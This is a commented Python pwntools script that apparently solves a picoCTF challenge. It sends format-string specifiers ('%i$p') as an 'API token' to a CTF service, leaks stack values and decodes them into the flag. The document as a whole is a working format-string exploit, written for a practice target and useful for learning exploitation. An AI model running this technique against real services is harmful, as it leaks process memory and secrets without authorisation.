# We need the pwn-tools library to enable the link-scraper
from pwn import *

#
flagOutput = b''

# We know that the flag starts at position 13
# We ran this script multiple times to figure out the end-position
# - If we didn't see the closing brace of the flag, then increase the end point
# - If we see too much garbage after the closing brace, then decrease the end point
startPtr = 15
endPtr = 25

# Rather than parse the whole of the returned value; we are going to just analyse
# the last block returned ... and iterate through the lengths of returned strings
# in order to build up a complete picture

# Iterate through potential lengths
for i in range(startPtr, endPtr):
    # Suppress errors generated by the PWN_TOOlS functions
    with context.local(log_level = "error"):
        # Connect to the service
        conn = remote("mercury.picoctf.net", 59616)

        # Read the incoming data until we see this text
        conn.recvuntil(b'What would you like to do?\n')
        # Then respond with "1" (sendline function simulates the 'enter' key as well)
        conn.sendline(b'1')

        # Read the incoming data until we see this text
        conn.recvuntil(b'What is your API token?')

        # Generate an exploitString of the required length (for this iteration)
        exploitString = f'%{i}$p'
        # Send the exploitString to the service
        conn.sendline(exploitString.encode('utf-8'))

        # Read the incoming data until we see this text
        conn.recvuntilS(b'Buying stonks with token:\n')
        # Then suck in the next line of text send from the service
        # This will be the stack dump
        responseString = conn.recvline()
        try:
            # Attempt to decode the incoming data, converting from hex and then
            # unpacks (p32) to correct from little-endian representation
            decoded = p32(int(responseString.decode(), 16))
            # Add the characters to the output
            flagOutput += decoded
        except Exception:
            # If anything barfs during decode, then just ignore it (via 'pass')
            pass
        # Read all the remaining data from the service and just ignore it
        # Then we start the iterator again with a new connection
        conn.recvall()

print(flagOutput)
